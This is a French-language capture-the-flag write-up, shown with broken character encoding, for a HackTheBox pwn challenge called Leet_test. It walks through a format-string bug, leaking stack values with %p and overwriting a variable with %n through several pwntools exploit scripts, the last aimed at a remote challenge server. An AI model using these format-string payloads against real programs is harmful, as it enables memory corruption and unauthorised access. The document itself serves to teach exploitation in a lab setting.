# Leet_test [Pwn] Challenge

â€” File Type â€”

Le programme est un 64 bit ELF Linux en sÃ©curitÃ© il Ã  un NX activÃ© on ne peux donc pas exÃ©cuter de code dans le stack.

Il y a une premiÃ¨re chose câ€™est que le prgramme Ã  lâ€™ouverture fait la commande `head /dev/urandom` 

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled.png)

Dans ghidra on constate un premier dÃ©faut de segmentation on a de base 280 caractÃ¨res dâ€™Ã©criture et nous avons 250 allouÃ© Ã  notre rÃ©ponse. 

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%201.png)

Ensuite dans lâ€™exÃ©cution du programme nous pouvons sortir de la boucle de texte et afficher le flag si nous arrivons Ã  faire Ã  ce que la variable local_13c * 0x13337c0de soit Ã©gale Ã  winner

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%202.png)

â€” Exploit the format String â€”

Dans notre programme %s est un format qui va ensuite examiner un argument qui est un pointeur. %s va prendre la chaÃ®ne vers laquelle pointe le pointeur et le print.

Normalement nous avons ceci en retour 

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%203.png)

Mais si nous mettons %s nous nous retrouvons avec Ã§a :

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%204.png)

Câ€™est trÃ¨s Ã©trange car nous sommes pas censÃ© avoir ce retour du tout.

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%205.png)

Avec plus de %s on se retrouve avec plus dâ€™erreur.

Si nous mettons %p nous allons leak des adresses haute 

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%206.png)

Si nous rajoutons des AAA au dÃ©but de notre entrÃ© avec les %p nous voyons les 0x616161

Et nous pouvons aussi Ã©crire %10$p ce qui va nous afficher le 10Ã¨me %p

â€” Exploit â€”

```python
#!/usr/bin/env python3

from pwn import *

def main():
        io = process('./leet_test')

        winner = 0x404078 #Trouver en cliquant sur winner dans Ghidra
        payload = p64(winner) + b'%10$p'
        io.sendlineafter('Please enter your name: ', payload)

        io.interactive()

if __name__ == '__main__':
        main()
```

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%207.png)

Nous avons bien notre payload fonctionnel il ressembla a cela car il retourne lâ€™adresse pour en faire un string.

Ce sript prend contrÃ´les des 3 varibles 

![Untitled](Leet_test%20%5BPwn%5D%20Challenge%202852f89c911a4174ab2cda5993882379/Untitled%208.png)

Avec IDA nous pouvons vÃ©rifier lâ€™Ã©tat de winner qui se transforme en winner 3 grace a nos 3 caractÃ¨re de la ligne si dessous qui remplace le payload du code prÃ©cÃ©dent.

```python
#!/usr/bin/env python3

from pwn import *

def main():
        io = process('./leet_test')

        winner = 0x404078 #Trouver en cliquant sur winner dans Ghidra
        payload = b'123%11$n' + p64(winner)
        io.sendlineafter('Please enter your name: ', payload)

        io.interactive()

if __name__ == '__main__':
        main()
```

Maintenant nous devons leak lâ€™adresse de /dev/urandom :

On sait que son adresse est dans le stack en mettant une dizaine de %p on se retrouve avec cela :

```python
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/Desktop]
â””â”€# ./leet_test                                                                                                                142 â¨¯
Welcome to HTB!
Please enter your name: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
Hello, 0x7fff8a20dec0 (nil) (nil) 0x7fff8a210000 (nil) 0x7fff8a21000f 0x147374533da7 0x3 0x100c30000 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa20702520 0x8000 0x7fc9745346ae (nil) 
Sorry! You aren't 1337 enough :(
Please come back later
------------------------
Welcome to HTB!
Please enter your name: zsh: alarm      ./leet_test
```

La 7Ã¨me adresse est celle de /dev/urandom 0x7fff8a21000f

Notre exploit final serra Ã§a :

```python
#!/usr/bin/env python3

from pwn import *

def main():
        context.arch = 'x86_64'
        io = remote('68.183.37.6', 31692)

        #STEP 1: Get /dev/random value
        io.sendlineafter('Please enter your name: ', '%7$p')
        random_value = io.recvline().decode()[-13:-9]
        log.success(f'Found random value: {random_value}')
        random_value = int(random_value, 16)

        #STEP 2: Overwrite winner
        target_value = random_value * 0x1337c0de
        log.info(f'Target value: {hex(target_value)}')

        winner = 0x404078
        payload = b'12345678910%12$n' + p64(winner)
        io.sendlineafter('Please enter your name: ', payload)

        def exec_fmt(payload):
                io.sendlineafter('Please enter your name: ', payload)
                io.info(f'Format string payload {payload} sent.')
                return io.recvline()

        f = FmtStr(exec_fmt, offset=10)
        f.write(winner, target_value)
        f.execute_writes()

        io.interactive()

if __name__ == '__main__':
        main()
```

Nous allons rÃ©Ã©crire le code et dÃ©clencher le break et pouvoir afficher le flag.